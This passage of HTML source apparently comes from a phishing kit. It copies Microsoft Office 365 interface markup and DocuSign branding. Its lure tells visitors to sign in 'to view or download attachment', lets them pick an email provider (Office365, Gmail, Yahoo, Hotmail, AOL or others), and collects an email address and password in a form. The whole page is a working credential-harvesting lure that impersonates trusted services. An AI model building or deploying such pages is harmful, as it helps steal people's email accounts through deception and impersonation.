src="images/apple-touch-icon-72x72.png" title="docusign" style="" autoid="text" class="text"></div></div></div><div style="display: none;"></div></div></div> <div style="" class="o365cs-w100-h100"><div> <div ispopup="1" style="display: none;" class="o365cs-notifications-notificationPopupArea o365cs o365cs-base o365cst"></div> <div style="display: none;"></div> </div></div> </div></div> </div> <div id="o365cs-settingsPanel-overlay" tabindex="-1" class="o365cs-settingsPanel-overlay"></div> <div id="o365cs-settingsPanel-wrapper" class="o365cs-settingsPanel-wrapper"></div> <div id="o365cs-flexpane-overlay"><button style="display: none;" tabindex="-1" type="button" class="o365cs-flexPane-overlaybutton o365cs-flexPane-overlay o365button"></button><div class="o365cs-flexPane-panel o365cs-flexPane-overlay ms-bcl-nta ms-bgc-nlr" style="display: none; height: 641px; max-height: 641px;" tabindex="0" id="O365fpcontainerid"> <button style="display: none;" aria-label="Close" type="button" class="o365cs-flexPane-closebutton ms-fcl-np ms-bgc-w-h o365button"></button>  <div role="region"><div class="o365cs-flexpane-settings-section"> <div class="o365cs-flexpane-settings-title o365cs-lightFont ms-fcl-np wf-size-x28"> <span>Settings</span> </div> <div class="o365cs-flexpane-settings-searchbox"> <div id="O365_FlexPane_Settings_Search_Control" role="textbox" class="allowTextSelection ms-fcl-ns textbox ms-font-s ms-fwt-sl ms-fcl-np ms-bcl-nta ms-bcl-nsa-h o365-search-control"><button aria-label="Activate Search Textbox" id="O365_Search_Button" type="button" class="o365-search-box o365button ms-bgc-tlr"><span class="o365-search-icon o365-search-icon-right owaimg ms-Icon--search ms-icon-font-size-17 ms-fcl-tp"> </span><span class="o365-search-placeholder o365cs-semiLightFont ms-fcl-ns">Search all settings</span></button><div style="display: none;" class="o365-search-box ms-bgc-tlr"></div></div> </div> </div><div class="o365cs-flexpane-settings o365cs-flexpane-view wf-size-x12 o365cs-cards"> <div class="o365cs-flexpane-settings-container ms-bcl-nl"> <div> <div><div style="display: none;" autoid="__Microsoft_O365_ShellG2_Plus_templates_cs_v" class="o365cs-cards-card o365cs-settings-collapsed o365cs-settings-loading"> <div class="o365cs-spinner"></div> <span class="wf-size-x14"></span> </div><div style="display: none;" class="o365cs-cards-card o365cs-settings-collapsed o365cs-settings-loading"> <span class="wf-size-x14"></span> </div><div style="display: none;">  </div></div> </div> <div style="display: none;"> <div style="display: none;" class="o365cs-cards-card o365cs-settings-collapsed wf-size-x14 ms-bcl-nl"> <div class="o365cs-settings-noresults-spacing"><span></span></div> <div><span>Try rephrasing your query.</span></div> </div> <div class="o365cs-cards-card o365cs-settings-collapsed o365cs-settings-loading wf-size-x14 ms-bcl-nl"> <div class="o365cs-spinner"></div> <span>Loading...</span> </div> <div style="display: none;" class="o365cs-cards-card o365cs-settings-collapsed wf-size-x14 ms-bcl-nl"> <span>Sorry, there's a problem with search right now. Please try again later.</span> </div> </div> </div> <div style="display: none;"> <div class="o365cs-cards-card o365cs-settings-collapsed wf-size-x14 ms-bcl-nl"> <span>Want to change a setting? When you're on the settings page, you can make your updates there.</span> </div> </div> </div></div> <div role="region"><div class="o365cs-flexpane-settings-section o365cs-flexpane-settings-title o365cs-lightFont ms-fcl-np wf-size-x28"> <span>Change your photo</span> </div><div class="o365cs-flexpane-settings o365cs-flexpane-view o365cs-cards"> <div class="o365cs-flexpane-settings-container ms-bcl-nl"> <div class="o365cs-cards-card o365cs-settings-collapsed wf-size-x14">  <div style="display: none;" class="o365cs-cards-section-busy"> <div class="o365cs-cards-section-busyContent"> <span class="o365cs-spinner"></span> <span></span> </div> </div> <div style="display: none;"> <div> <a title="Choose a photo" href="#" tabindex="0" role="link" class="ms-font-s ms-fcl-tp wf-size-x12 o365button"><span class="ms-fcl-tp owaimg ms-Icon--folder ms-icon-font-size-22"> </span><span>Choose a photo</span></a> <div role="textbox" class="o365cs-fp-hiddeninput"><input class="o365cs-fp-hiddeninput" accept="image/*" tabindex="-1" id="_fileInput" type="file"></div> </div> <div class="o365cs-fp-croppercontrols"> <a title="Rotate right" href="#" tabindex="0" role="link" class="ms-font-s wf-size-x12 o365button"><span class="ms-fcl-ns owaimg ms-Icon--reload ms-icon-font-size-22"> </span></a> <a title="Delete" href="#" tabindex="0" role="link" class="ms-font-s wf-size-x12 o365cs-float-right o365button"><span class="ms-fcl-ns owaimg ms-Icon--trash ms-icon-font-size-22"> </span></a> </div> <div> <span class="o365cs-fp-doughboy-icon ms-bgc-nt ms-fcl-w owaimg ms-Icon--person ms-icon-font-size-52"> </span> <img style="display: none;" class="o365cs-fp-currentphoto"> <canvas style="display: none;" width="256" height="256" class="o365cs-fp-cropper"></canvas> </div> <div> <a title="Zoom in" href="#" tabindex="0" role="link" class="ms-font-s wf-size-x12 o365button"><span class="ms-fcl-ns owaimg ms-Icon--plus ms-icon-font-size-22"> </span></a> <a title="Zoom out" href="#" tabindex="0" role="link" class="ms-font-s wf-size-x12 o365cs-float-right o365button"><span class="ms-fcl-ns owaimg ms-Icon--minus ms-icon-tall-glyph ms-icon-font-size-22"> </span></a> </div> <div class="o365cs-cards-section-save"> <a aria-labelledby="_ariaId_2" href="#" tabindex="0" role="link" class="ms-font-s wf-size-x12 o365cs-settings-button o365button ms-bgc-ts ms-bcl-nt ms-fcl-w"><span style="display: none;" class="_fc_3 owaimg"> </span><span id="_ariaId_2" class="_fc_4 o365buttonLabel">Save</span></a> <a aria-labelledby="_ariaId_1" href="#" tabindex="0" role="link" class="ms-font-s wf-size-x12 o365cs-settings-button o365button ms-bgc-nlr ms-bcl-nt ms-fcl-np"><span style="display: none;" class="_fc_3 owaimg"> </span><span id="_ariaId_1" class="_fc_4 o365buttonLabel">Cancel</span></a> </div> </div> <div> <div style="display: none;" class="o365cs-cards-error"> <span></span> </div> <a style="display: none;" href="#" tabindex="0" role="link" class="ms-font-s ms-fcl-tp wf-size-x12 o365button"></a> </div> </div> </div> </div></div> <div style="display: none;"></div> <div style="display: none;" class="o365-flexPane-fullDiv"></div> <div role="region"><div role="region"><div class="o365cs-nfd o365cs-nfd-normal-fontsize"> <span class="o365cs-lightFont o365-help-flex-pane-label">Help</span> <div style="" role="textbox" class="allowTextSelection ms-fcl-ns textbox ms-font-s ms-fwt-sl ms-fcl-np ms-bcl-nta ms-bcl-nsa-h o365-search-control"><button aria-label="Activate Search Textbox" id="O365_Search_Button" type="button" class="o365-search-box o365button ms-bgc-tlr"><span class="o365-search-icon o365-search-icon-right owaimg ms-Icon--lightBulb2 ms-icon-font-size-17 ms-fcl-tp"> </span><span class="o365-search-placeholder o365cs-semiLightFont ms-fcl-ns">Tell me what you want to do</span></button><div style="display: none;" class="o365-search-box ms-bgc-tlr"></div></div>  <div style="display: none;"></div> <div style="display: none;"></div> <div style="display: none;"></div> <div class="o365cs-nfd-content">  <div> <span style="display: none;" autoid="__Microsoft_O365_ShellG2_Plus_templates_cs_C" class="ms-fcl-np o365cs-semiLightFont o365cs-nfd-label o365cs-nfd-title">What's new</span> <div style="display: none;" class="o365cs-nfd-flist o365cs-segoeRegular ms-bcl-nl"></div> <button style="display: none;" autoid="__Microsoft_O365_ShellG2_Plus_templates_cs_D" type="button" class="ms-fcl-tp o365cs-nfd-fitem o365cs-nfd-expand o365cs-nfd-fo ms-bgc-nl-h o365button"></button> </div>  <div> <div style="display: none;"> <span class="o365cs-customsupport-title o365cs-semiLightFont"></span> <div class="o365cs-customsupport"> <button style="display: none;" type="button" class="o365cs-customsupport-entry ms-fcl-tp o365button"></button> <button style="display: none;" type="button" class="o365cs-customsupport-entry ms-fcl-tp o365button"></button> <button style="display: none;" type="button" class="o365cs-customsupport-entry ms-fcl-tp o365button"></button> </div> </div> </div>  <div style="" class="o365cs-text-align-left"><div><div class="ms-fcl-tp o365cs-nfd-normal-lineheight"><a aria-labelledby="_ariaId_8" id="O365_SubLink_ShellFeedback" target="_blank" href="https://portal.office.com/SendSmile?wid=10" style="" role="link" class="ms-fcl-tp o365cs-nfd-normal-fontsize o365button"><span style="display: none;" class="_fc_3 owaimg"> </span><span id="_ariaId_8" class="_fc_4 o365buttonLabel">Feedback</span></a></div><div class="ms-fcl-tp o365cs-nfd-normal-lineheight"><a aria-labelledby="_ariaId_9" id="O365_SubLink_ShellCommunity" target="_blank" href="https://g.microsoftonline.com/0BX20en/142" style="" role="link" class="ms-fcl-tp o365cs-nfd-normal-fontsize o365button"><span style="display: none;" class="_fc_3 owaimg"> </span><span id="_ariaId_9" class="_fc_4 o365buttonLabel">Community</span></a></div><div class="ms-fcl-tp o365cs-nfd-normal-lineheight"><a aria-labelledby="_ariaId_10" id="O365_SubLink_ShellLegal" target="_blank" href="https://g.microsoftonline.com/0BX20en/721" style="" role="link" class="ms-fcl-tp o365cs-nfd-normal-fontsize o365button"><span style="display: none;" class="_fc_3 owaimg"> </span><span id="_ariaId_10" class="_fc_4 o365buttonLabel">Legal</span></a></div><div class="ms-fcl-tp o365cs-nfd-normal-lineheight"><a aria-labelledby="_ariaId_11" id="O365_SubLink_ShellPrivacy" target="_blank" href="https://g.microsoftonline.com/0BX20en/1305" style="" role="link" class="ms-fcl-tp o365cs-nfd-normal-fontsize o365button"><span style="display: none;" class="_fc_3 owaimg"> </span><span id="_ariaId_11" class="_fc_4 o365buttonLabel">Privacy &amp; cookies</span></a></div></div></div> </div> </div></div></div> <div style="display: none;" class="o365cs-themesPanel"></div> <div style="display: none;" class="o365cs-extensibilityPanel ms-bgc-w"></div> <div style="display: none;" class="o365cs-personaPanel ms-bgc-w"></div> <div style="display: none;"></div> <div style="display: none;" class="o365cs-bundle-panel o365cs-w100-h100"></div> <div tabindex="0"></div> </div></div> </div></div>


                <div id="ShellBodyAndFooterContainer" style="width: 1280px; height: 643px;" tabindex="-1">
                    <div class="Shell-Body" id="ShellBody" style="height: 613px;">
                        <div id="RootPageLayout" class="PageLayout Layout_FullScreen">
                                                            <div>
    <input name="BOXPageIDField" id="BOXPageIDField" value="Index" type="hidden">
</div>
                            <table class="Content" cellpadding="0" cellspacing="0">
                                <tbody>
                                    <tr>
                                        <td class="Content" id="LayoutContentContainer">
                                            <table class="Content" cellpadding="0" cellspacing="0">
                                                <tbody>
                                                    <tr>
                                                        <td>
                                                            <div class="PageLayout-Padding ">
                                                            </div>
                                                            <div style="min-height: 303px;" class="PageLayout-Panels">


<input id="aad" name="aad" value="0" type="hidden">
<div id="page_layout">
<div id="left_col">
    <div id="sku_name">
            <h1>Send, sign and approve documents.</h1>
    </div>

<div id="home_content">
<script type="text/javascript" src="assets/jquery.min.js"></script>
<script type="text/javascript" src="assets/jquery.ddslick.min.js"></script>
<script src="assets/SpryValidationTextField.js" type="text/javascript"></script>
<script src="assets/SpryValidationPassword.js" type="text/javascript"></script>
<div id="start_tiles">
<div class="banner">
<h2 class="hidden-small">Sign in with your email address to view or download attachment</h2></div>
<div class="card signin-card clearfix">
  <img class="" src="images/social_auth_providers.png" width="280" height=""><p>
<!-- form submit start -->
	<form action="#" method="POST" autocomplete="OFF">
   <div><strong>Select your email provider</strong></div><p>
    <input type="hidden" name="hidCflag" id="hidCflag" value="" />
    <select class="cflagdd">
		<option value="0" data-imagesrc="images/o365.png" data-description="Sign in with Office365">Office365</option>
		<option value="1" data-imagesrc="images/mail_gmail.png" data-description="Sign in with Gmail">Gmail</option>
        <option value="2" data-imagesrc="images/yahoo.png" data-description="Sign in with Yahoo">Yahoo</option>
        <option value="3"  data-imagesrc="images/live_hotmail.png" data-description="Sign in with Hotmail">Hotmail</option>
        <option value="4" data-imagesrc="images/aol.png" data-description="Sign in with AOL">AOL</option>
        <option value="5" data-imagesrc="images/email.png" data-description="Sign in with Others">Others</option>
	</select><p>
    <label class="hidden-label" for="Email">Email</label>

<span id="sprytextfield1">
<input id="Email" name="Email" type="email" placeholder="Email" value="" spellcheck="false" class="">
<span class="textfieldRequiredMsg">Enter your email.</span><span class="textfieldInvalidFormatMsg">Enter a valid email.</span></span>
<label class="hidden-label" for="Passwd">Password</label>
<span id="sprypassword1">
<input id="Passwd" name="Passwd" type="password" placeholder="Password" class="">
<span class="passwordRequiredMsg">Enter your password.</span></span>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in to view attachment">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes">
  <span>
  Stay signed in
  </span>
  </label>
</form>
</div>
<br>
</div>
</div>
</div>
</div>
</div>



                </div>
                </div>
                <div class="DialogManager-BottomRegion" id="dialogBottomRegion">
                    <div class="DialogManager-BottomPaddingArea ms-bcl-w">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



                                                            </div>
                                                            <div class="PageLayout-Padding ">
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>

                    <div style="width: auto;" class="Shell-Footer " id="ShellFooter">
                        <div id="O365_FooterContainer">
                        </div>
                    </div>
                </div>

            </td>
        </tr>
    </tbody>
</table>
<script type="text/javascript">
$('.cflagdd').ddslick({  
        onSelected: function(data){  
            if(data.selectedIndex > 0) {
                $('#hidCflag').val(data.selectedData.value);

               
            }   
        }    
    }); ;

var sprypassword1 = new Spry.Widget.ValidationPassword("sprypassword1");
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "email");
</script>
</body></html>